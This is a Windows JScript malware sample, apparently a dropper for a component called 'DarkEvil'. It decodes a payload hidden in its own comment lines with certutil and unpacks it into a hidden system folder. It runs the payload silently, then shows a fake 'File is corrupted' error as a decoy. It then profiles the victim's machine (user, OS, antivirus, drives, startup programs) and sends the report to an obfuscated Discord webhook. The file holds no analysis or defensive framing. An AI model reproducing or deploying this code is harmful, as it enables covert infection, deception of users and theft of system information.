function a1(a2, a3) {
    var a4, a5, a6, a7, a8;
    a8 = "Scripting.FileSystemObject";
    a7 = "WScript.Shell";
    a4 = new ActiveXObject(a7);
    a5 = new ActiveXObject(a8);
    a6 = "certutil -decode \"" + a2 + "\" " + a3;
    a4.Run(a6, 0, true);
}

function b1(b2, b3) {
    var b4, b5, b6, b7, b8;
    b8 = "Scripting.FileSystemObject";
    b7 = "WScript.Shell";
    b4 = new ActiveXObject(b7);
    b5 = new ActiveXObject(b8);
    b6 = "expand " + b2 + " -F:* " + b3;
    b4.Run(b6, 0, true);
}

function c1(c2) {
    var c3, c4;
    c3 = new ActiveXObject("Scripting.FileSystemObject");
    if (!c3.FolderExists(c2)) {
        c4 = c3.CreateFolder(c2);
        c4.Attributes = c4.Attributes | 2;
    }
    c4 = null;
    c3 = null;
}

function d1(d2) {
    var d3, d4;
    d4 = "WScript.Shell";
    d3 = new ActiveXObject(d4);
    d3.Run(d2, 0, true);
	d3.Popup("File is corrupted", 0, "Error", 0x10);
}

var x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, s1;
x7 = "WScript.Shell";
x1 = new ActiveXObject(x7);
x2 = x1.ExpandEnvironmentStrings("%TEMP%");
x3 = x1.ExpandEnvironmentStrings("%SYSTEMDRIVE%");
x4 = x2 + "\\output.txt";
x5 = x3 + "\\Dark\\";
x6 = "cscript " + x5 + "AutoRun.vbs";

x8 = new ActiveXObject("Scripting.FileSystemObject");
x9 = x8.OpenTextFile(WScript.ScriptFullName, 1);
x10 = x8.OpenTextFile(x4, 2, true); 
while (!x9.AtEndOfStream) {
    s1 = x9.ReadLine();
    if (s1.indexOf("//") === 0) {
        x10.WriteLine(s1.substring(2));
    }
}

x9.Close();
x10.Close();

x9 = null;
x10 = null;
x8 = null;

c1(x5);
a1(x4, x5 + "DE.zip");
b1(x5 + "DE.zip", x5);
WScript.Sleep(1000);
d1(x6);



var fso = new ActiveXObject("Scripting.FileSystemObject");
var wshShell = new ActiveXObject("WScript.Shell");


function getHostName() {
    return wshShell.ExpandEnvironmentStrings("%COMPUTERNAME%");
}

function getUsername() {
    return wshShell.ExpandEnvironmentStrings("%USERNAME%");
}

function getWinVersion() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var colOS = wmi.ExecQuery("Select * from Win32_OperatingSystem");
        var e = new Enumerator(colOS);
        for (; !e.atEnd(); e.moveNext()) {
            var os = e.item();
            return os.Caption + " (Build " + os.BuildNumber + ")";
        }
    } catch (e) {
    }
    return "Unknown";
}

function getArch() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var colProc = wmi.ExecQuery("Select AddressWidth from Win32_Processor");
        var e = new Enumerator(colProc);
        for (; !e.atEnd(); e.moveNext()) {
            var proc = e.item();
            return proc.AddressWidth + "-bit";
        }
    } catch (e) {
    }
    return "Unknown";
}

function getAntivirus() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\SecurityCenter2");
        var colAV = wmi.ExecQuery("Select * from AntivirusProduct");
        var avList = "";
        var e = new Enumerator(colAV);
        for (; !e.atEnd(); e.moveNext()) {
            var av = e.item();
            avList += av.displayName + ", ";
        }
        if (avList.length > 0) {
            return avList.substring(0, avList.length - 2);
        }
    } catch (e) {
    }
    return "None or Unknown";
}

function getDrives() {
    try {
        var drives = fso.Drives;
        var result = "";
        var e = new Enumerator(drives);
        for (; !e.atEnd(); e.moveNext()) {
            var d = e.item();
            if (d.IsReady) {
                result += d.DriveLetter + ": (" + (d.VolumeName || "Local Disk") + "), ";
            }
        }
        if (result.length > 0) {
            return result.substring(0, result.length - 2);
        }
    } catch (e) {
    }
    return "No drives found";
}

function getTotalRAM() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var colSys = wmi.ExecQuery("Select TotalPhysicalMemory from Win32_ComputerSystem");
        var e = new Enumerator(colSys);
        for (; !e.atEnd(); e.moveNext()) {
            var sys = e.item();
            var total = parseFloat(sys.TotalPhysicalMemory);
            return Math.round(total / 1073741824 * 10) / 10 + " GB";
        }
    } catch (e) {
    }
    return "Unknown";
}

function getCPUName() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var colCPU = wmi.ExecQuery("Select Name from Win32_Processor");
        var e = new Enumerator(colCPU);
        for (; !e.atEnd(); e.moveNext()) {
            var cpu = e.item();
            return cpu.Name.trim();
        }
    } catch (e) {
    }
    return "Unknown";
}

function getGPUName() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var colGPU = wmi.ExecQuery("Select Name from Win32_VideoController");
        var gpus = "";
        var e = new Enumerator(colGPU);
        for (; !e.atEnd(); e.moveNext()) {
            var gpu = e.item();
            gpus += gpu.Name + ", ";
        }
        if (gpus.length > 0) {
            return gpus.substring(0, gpus.length - 2);
        }
    } catch (e) {
    }
    return "Unknown";
}

function getStartupPrograms() {
    try {
        var output = "";
        var regPaths = [
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        ];
        
        for (var i = 0; i < regPaths.length; i++) {
            var path = regPaths[i];
            var subOutput = "";
            
            var objReg = GetObject("winmgmts:\\\\.\\root\\default:StdRegProv");
            var rootKey, subKey;
            
            if (path.indexOf("HKLM") == 0) {
                rootKey = 0x80000002;
                subKey = path.substring(5);
            } else if (path.indexOf("HKCU") == 0) {
                rootKey = 0x80000001;
                subKey = path.substring(5);
            }
            
            var valueNames = new VBArray(objReg.EnumValues(rootKey, subKey)).toArray();
            var types = new VBArray(objReg.EnumValues(rootKey, subKey)).toArray();
            
            if (valueNames != null) {
                for (var j = 0; j < valueNames.length; j++) {
                    var value = "";
                    objReg.GetStringValue(rootKey, subKey, valueNames[j], value);
                    subOutput += "  " + valueNames[j] + " = " + value + "\r\n";
                }
            } else {
                subOutput = "  (No values)\r\n";
            }
            
            if (subOutput.trim() != "") {
                output += "[" + path + "]\r\n" + subOutput;
            }
        }
        
        if (output.length > 0) {
            return output.trim();
        }
    } catch (e) {
    }
    return "No startup entries found.";
}

function checkDarkEvilStatus() {
    try {
        var basePath = wshShell.ExpandEnvironmentStrings("%systemdrive%") + "\\Dark\\";
        var requiredFiles = ["RunDark.bat", "DarkEClient64.dll", "DarkEClient32.dll", "LoadDarkEClient.ps1", "AutoRun.vbs"];
        
        for (var i = 0; i < requiredFiles.length; i++) {
            var filePath = basePath + requiredFiles[i];
            if (!fso.FileExists(filePath)) {
                return "Failed to install DarkEvil";
            }
        }
        return "DarkEvil Installed";
    } catch (e) {
        return "Unknown";
    }
}

function base64Decode(base64) {
    var xml = new ActiveXObject("Msxml2.DOMDocument.3.0");
    var node = xml.createElement("b64");
    node.dataType = "bin.base64";
    node.text = base64;
    return node.nodeTypedValue;
}

function bytesToStr(bytes) {
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(bytes);
    stream.Position = 0;
    stream.Type = 2;
    stream.Charset = "utf-8";
    var result = stream.ReadText();
    stream.Close();
    return result;
}

function escapeJson(str) {
    str = str.replace(/\\/g, "\\\\");
    str = str.replace(/"/g, '\\"');
    str = str.replace(/\r\n/g, "\\n");
    str = str.replace(/\n/g, "\\n");
    str = str.replace(/\r/g, "\\n");
    return str;
}

function sendDiscordWebhook(info, hostname) {
    try {
        var encodedUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjQxODc2ODczODU4MjY4OC9PY0dPbzBQM2ZKUWl6Y3UzVi1jTmJlOFBKcS1ZRXpSYkxkLVl6Z2lMdWZPWnV6UzhabkhsV3RZOC1xU3RTczdHdks5Rw==";
        var decodedBytes = base64Decode(encodedUrl);
        var webhookUrl = bytesToStr(decodedBytes);
        
        var escapedInfo = escapeJson(info);
        var data = '{"content":"' + escapedInfo + '","username":"' + hostname + '"}';
        
        var http = new ActiveXObject("MSXML2.ServerXMLHTTP");
        http.setOption(2, 13056);
        http.open("POST", webhookUrl, false);
        http.setRequestHeader("Content-Type", "application/json");
        http.send(data);
        
        return http.status;
    } catch (e) {
        return 0;
    }
}

function main() {
    try {
        var info = "**[SYSTEM INFO CAPTURED]**\r\n" +
                   "**Hostname:** " + getHostName() + "\r\n" +
                   "**Username:** " + getUsername() + "\r\n" +
                   "**OS:** " + getWinVersion() + "\r\n" +
                   "**Architecture:** " + getArch() + "\r\n" +
                   "**Antivirus:** " + getAntivirus() + "\r\n" +
                   "**Drives:** " + getDrives() + "\r\n" +
                   "**CPU:** " + getCPUName() + "\r\n" +
                   "**GPU:** " + getGPUName() + "\r\n" +
                   "**Total RAM:** " + getTotalRAM() + "\r\n" +
                   "**Startup Programs:** " + getStartupPrograms() + "\r\n" +
                   "**DarkEvil:** " + checkDarkEvilStatus();
       
        var status = sendDiscordWebhook(info, getHostName());
        return true;
    } catch (e) {
        return false;
    }
}

main();
